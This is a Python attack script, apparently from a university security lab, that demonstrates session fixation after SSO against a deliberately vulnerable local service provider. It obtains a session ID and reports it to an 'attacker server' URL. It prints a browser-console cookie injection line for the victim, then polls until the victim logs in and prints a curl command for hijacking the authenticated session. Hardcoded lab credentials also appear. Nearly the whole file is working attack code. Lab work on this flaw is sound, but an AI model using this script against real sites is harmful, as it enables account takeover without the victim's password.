#!/usr/bin/env python3
"""
A-09 — Session Fixation after SSO
GID Lab — Grupo 4

Demonstra como um atacante pode fixar um session ID no SP1 e, após
a vítima fazer login com esse ID, ganhar acesso autenticado sem
conhecer as credenciais.

Pré-requisitos:
  - SP1 a correr em http://localhost:5001
  - VULN_A09_NO_SESSION_REGEN = True em sp1/config.py
  - flask-session instalado no SP1 (sessões server-side)

Utilização:
  python attacks/a09_session_fixation.py
"""

import http.cookiejar
import sys
import time
import urllib.request
import urllib.parse

SP1_BASE    = "http://localhost:5001"
ATTACKER_BASE = "http://localhost:9999"

LINE = "=" * 60

def print_step(n, title):
    print(f"\n{LINE}")
    print(f"  PASSO {n}: {title}")
    print(LINE)

def get_fresh_session_id():
    """
    Visita o SP1 sem fazer login para obter um session ID legítimo.
    O SP1 cria uma sessão vazia e devolve o cookie sp1_session.
    """
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    try:
        opener.open(f"{SP1_BASE}/")
    except Exception as e:
        print(f"  [ERRO] Não foi possível contactar SP1: {e}")
        sys.exit(1)

    for cookie in jar:
        if cookie.name == "sp1_session":
            return cookie.value

    return None


def check_authenticated_access(session_id):
    """
    Tenta aceder ao dashboard do SP1 usando o session ID fornecido.
    Devolve True se o acesso for autenticado (sem redirect para login).
    """
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPRedirectHandler()
    )

    # Injectar o session ID manualmente
    req = urllib.request.Request(f"{SP1_BASE}/dashboard")
    req.add_header("Cookie", f"sp1_session={session_id}")

    try:
        # Desactivar redirects para detectar se vai para /login
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def http_error_302(self, req, fp, code, msg, headers):
                raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)
            http_error_301 = http_error_302
            http_error_303 = http_error_302

        opener2 = urllib.request.build_opener(NoRedirect())
        opener2.open(req)
        return True   # Sem redirect = autenticado
    except urllib.error.HTTPError as e:
        if e.code in (301, 302, 303):
            return False  # Redirect para login = não autenticado
        return False
    except Exception:
        return False


def main():
    print(f"\n{'#'*60}")
    print(f"#  A-09 — Session Fixation Demonstração  #")
    print(f"#  GID Lab Grupo 4                        #")
    print(f"{'#'*60}")

    # ------------------------------------------------------------------
    # PASSO 1: Atacante obtém um session ID do SP1
    # ------------------------------------------------------------------
    print_step(1, "Atacante obtém session ID do SP1")
    print(f"\n  Visitando {SP1_BASE}/ sem fazer login...")

    sid = get_fresh_session_id()
    if not sid:
        print("\n  [ERRO] Não foi possível obter session ID.")
        print("  Certifica-te que o SP1 está a correr e usa flask-session.")
        sys.exit(1)

    print(f"\n  ✅ Session ID obtido:")
    print(f"     sp1_session = {sid}")

    # ------------------------------------------------------------------
    # PASSO 2: Registar o session ID no attacker server
    # ------------------------------------------------------------------
    print_step(2, "Registar session ID no attacker server")
    try:
        url = f"{ATTACKER_BASE}/fixate?sid={urllib.parse.quote(sid)}"
        resp = urllib.request.urlopen(url)
        data = resp.read().decode()
        print(f"\n  ✅ Registado: {data[:120]}")
    except Exception as e:
        print(f"\n  [AVISO] Attacker server não respondeu: {e}")

    # ------------------------------------------------------------------
    # PASSO 3: Instruções para a vítima
    # ------------------------------------------------------------------
    print_step(3, "Injectar o cookie na vítima (instrução manual)")
    print(f"""
  O atacante envia à vítima um link ou injeta o cookie via XSS/MITM:

  ┌─────────────────────────────────────────────────────┐
  │  Cookie a injectar no browser da vítima:            │
  │                                                     │
  │  Nome:   sp1_session                                │
  │  Valor:  {sid[:50]}...│
  │  Domínio: localhost                                 │
  │  Path:   /                                          │
  └─────────────────────────────────────────────────────┘

  No browser da vítima, abre a consola (F12) e executa:

    document.cookie = "sp1_session={sid}; path=/";

  Depois faz login em http://localhost:5001 com:
    Username: bob
    Password: bob123
""")

    # ------------------------------------------------------------------
    # PASSO 4: Aguardar que a vítima faça login
    # ------------------------------------------------------------------
    print_step(4, "Aguardar login da vítima...")
    print("\n  A verificar acesso de 10 em 10 segundos.")
    print("  (Ctrl+C para parar)\n")

    attempts = 0
    max_attempts = 30   # 5 minutos

    try:
        while attempts < max_attempts:
            attempts += 1
            is_auth = check_authenticated_access(sid)

            status = "✅ AUTENTICADO!" if is_auth else "⏳ aguardando login..."
            print(f"  [{attempts:02d}/{max_attempts}] {status}", end="\r", flush=True)

            if is_auth:
                # ------------------------------------------------------------------
                # PASSO 5: Acesso bem-sucedido com o session ID fixo
                # ------------------------------------------------------------------
                print_step(5, "ATAQUE BEM-SUCEDIDO!")
                print(f"""
  O atacante acede ao SP1 com o session ID fixo:

    curl -s http://localhost:5001/dashboard \\
         -b "sp1_session={sid}" \\
         -L

  Ou no browser, confirma que o cookie sp1_session={sid[:30]}...
  ainda está definido e acede a http://localhost:5001/dashboard

  ➜ O atacante tem acesso à sessão autenticada de bob SEM saber
    a sua password!
""")
                print(f"\n  Cookie a usar:")
                print(f"  sp1_session={sid}")
                return

            time.sleep(10)

    except KeyboardInterrupt:
        pass

    print(f"\n\n  [TIMEOUT] A vítima não fez login em {max_attempts * 10}s.")
    print(f"  O session ID ainda é: {sid}")


if __name__ == "__main__":
    main()
